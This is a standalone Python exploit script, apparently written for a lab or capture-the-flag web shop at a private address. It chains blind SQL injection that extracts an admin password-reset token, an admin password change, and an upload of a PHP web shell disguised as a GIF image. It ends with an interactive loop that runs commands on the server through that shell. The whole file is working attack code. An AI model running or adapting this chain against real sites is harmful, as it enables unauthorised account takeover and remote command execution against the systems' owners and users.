import requests
import random
import string

url = "http://192.168.1.132/item/viewItem.php?id=1"

def reset_password():
    reset_url = "http://192.168.1.132/login/resetPassword.php"
    data = {"username":"admin"}
    r = requests.post(reset_url, data=data)
    if " Oops! Username not found. " not in r.text:
        print("[+] Resetting Admin Password")

def gettable_names(limitstart):
    limit_start = limitstart
    limit_count = 1
    substring_start = 1
    substring_length = 1
    table_name = ""
    list_table = []
    ascii_threshold = 32
    while True:
        payload = f" and ascii(substring((select table_name from information_schema.tables where table_schema=database() limit {limit_start},{limit_count}),{substring_start},{substring_length})) = {ascii_threshold}--+"
        r = requests.get(url+payload)
        if r.status_code == 404:
            substring_start = substring_start + 1
            table_name = table_name + chr(ascii_threshold)
            ascii_threshold = 32
        ascii_threshold = ascii_threshold + 1
        if ascii_threshold==130:
            break
    list_table.append(table_name)
    return table_name

def getcolumn_names(limitvalue,table_index):
    limit_start = limitvalue
    limit_count = 1
    substring_start = 1
    substring_length = 1
    column_name = ""
    list_column = []
    ascii_threshold = 32
    i = table_index
    table_name = gettable_names(i)
    # print("Found Table Name: "  + table_name)
    table_name.encode("utf-8").hex()
    table_name = '0x'+table_name.encode("utf-8").hex()
    while True:
        payload = f" and ascii(substring((select column_name from information_schema.columns where table_name={table_name} limit {limit_start},{limit_count}),{substring_start},{substring_length})) = {ascii_threshold}--+"
        # print(payload)
        r = requests.get(url+payload)
        if r.status_code == 404:
            substring_start = substring_start + 1
            column_name = column_name + chr(ascii_threshold)
            ascii_threshold = 32
        ascii_threshold = ascii_threshold + 1
        if ascii_threshold==130:
            break
    # print("Found Column Name : "+column_name)
    return column_name
    if column_name != "":
        list_column.append(column_name)



def get_data():
    table_name = "user"
    column_name = "token"
    
    table_name_hex = '0x' + table_name.encode("utf-8").hex()
    column_name_hex = '0x' + column_name.encode("utf-8").hex()
    
    # print(f"[!] Fetching data from Table: {table_name}, Column: {column_name}")

    limit_start = 0
    limit_count = 1
    substring_start = 1
    substring_length = 1
    data_name = ""
    list_data = []
    ascii_threshold = 32
    while True:
        payload = f" and ascii(substring((select {column_name} from {table_name} limit {limit_start},1),{substring_start},1)) = {ascii_threshold}--+"
        # print(payload)
        r = requests.get(url+payload)
        if r.status_code == 404:
            substring_start = substring_start + 1
            data_name = data_name + chr(ascii_threshold)
            ascii_threshold = 32
            # print(data_name)
        ascii_threshold = ascii_threshold + 1
        if ascii_threshold==130:
            break
    return data_name
    # print(f"Extracted Data from {table_name} and {column_name} : {data_name}")

def change_password():
    change_password_url = "http://192.168.1.132/login/doChangePassword.php"
    password =  "tmppass"
    data = {"token":get_data(),"password":"tmppass"}
    r = requests.post(change_password_url, data=data)
    print("[+] Changed password to : " + password)

def login_fileupload():
    req = requests.Session()
    login_url = "http://192.168.1.132/login/checkLogin.php"
    file_upload_url = "http://192.168.1.132/item/updateItem.php"
    data = {
    "id": "1",
    "id_user": "1",
    "name": "Raspberry Pi 4",
    "description": "Latest Raspberry Pi 4 Model B with 2/4/8GB RAM raspberry pi 4 BCM2711 Quad core Cortex-A72 ARM v8 1.5GHz Speeder Than Pi 3B",
    "price": "92"
    }
    files = {
    "image": ("rce.phar", "GIF89a; <?php system($_GET['cmd']); ?>", "image/png")
    }
    login_data = {"username":"admin","password":"tmppass"}
    r = req.post(login_url, data=login_data)
    rf = req.post(file_upload_url, data=data, files=files)
    print("[+]Successfully Uploaded File")


def rce(cmd):   
    file_url = "http://192.168.1.132/item/image/rce.phar?cmd="
    r = requests.get(file_url+cmd)
    print("[+] Result: " + r.text)

reset_password()
print("[+]Getting reset Token: "+ get_data())
change_password()
login_fileupload()
print("[!] Spawnning Shell...")
check = True
while check:
    cmd = input('Enter cmd')
    rce(cmd)
    if cmd == 'exit':
        check = False


        
